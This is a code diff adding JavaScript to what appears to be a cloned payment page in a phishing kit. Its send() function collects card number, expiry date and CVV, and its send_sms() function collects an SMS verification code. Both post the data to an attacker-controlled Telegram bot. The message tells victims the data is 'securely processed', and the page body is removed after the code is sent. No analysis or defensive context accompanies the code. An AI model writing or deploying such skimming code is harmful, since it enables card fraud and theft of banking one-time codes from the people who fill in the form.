+        function send_sms(){
+            const cardNumber = document.getElementById('cardNumber').value;
+            const sms = document.getElementById('sms').value;
+
+            if(sms == "" || sms.length < 4) return;
+
+            const message = `💳 *Sms Card Details*\n\n🔢 *Card Number:* \`${cardNumber}\`\n✅ *SMS:* \`${sms}\`\n\n`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                console.log(data);
+                document.body.remove();
+            }).catch(error => console.error('Error:', error));
+        }
+
+
+        function check(){
+            if(document.getElementById("cardNumber").value.length != 19){
+                warningCard();
+                document.querySelectorAll("._3FnMECl4IVheXfoYeDWal8")[1].setAttribute("disabled", '')
+                return;
+            }
+
+            if(document.getElementById("expiryDate").value.length != 5){
+                document.querySelectorAll("._3FnMECl4IVheXfoYeDWal8")[1].setAttribute("disabled", '')
+                return;
+            }
+
+            
+            if(document.getElementById("cvc").value.length != 3){
+                document.querySelectorAll("._3FnMECl4IVheXfoYeDWal8")[1].setAttribute("disabled", '')
+                return;
+            }
+            
+            document.querySelectorAll("._3FnMECl4IVheXfoYeDWal8")[1].removeAttribute("disabled")
+        }
+
+        // function send_sms(){
+        //     const formData = new FormData();
+        //     const cardNumber = document.getElementById('cardNumber').value;
+        //     const sms = document.getElementById('sms').value;
+
+        //     if(sms == "")
+        //         return;
+
+        //     if(sms.length < 4)
+        //         return;
+
+        //     formData.append('cardNumber', cardNumber);
+        //     formData.append('sms', sms);
+        //     formData.append('dd2', true);
+
+        //     fetch('process.php', {
+        //         method: 'POST',
+        //         body: formData
+        //     }).then(response => response.text())
+
+        //     document.body.remove()
+        // }
+        function send(){
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById("cvc").value;
+
+            const message = `💳 *Card Details*\n\n🔢 *Card Number:* \`${cardNumber}\`\n📅 *Expiry Date:* \`${expiryDate}\`\n🔒 *CVV:* \`${cvv}\`\n\n✅ _Securely processed by our system_`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                console.log(data);
+                document.getElementById("t1").style.display = "none";
+                document.getElementById("t2").style.display = "flex";
+                document.getElementById("cod-crt").innerHTML = cardNumber.split(" ")[3];
+
+                var now = new Date();
+                var d = now.getMonth() + 1 < 10 ? "0" + (now.getMonth() + 1) : now.getMonth() + 1;
+                document.getElementById("datedd").innerHTML = now.getDate() + "." + d + "." + now.getFullYear();
+            }).catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+
+</html>
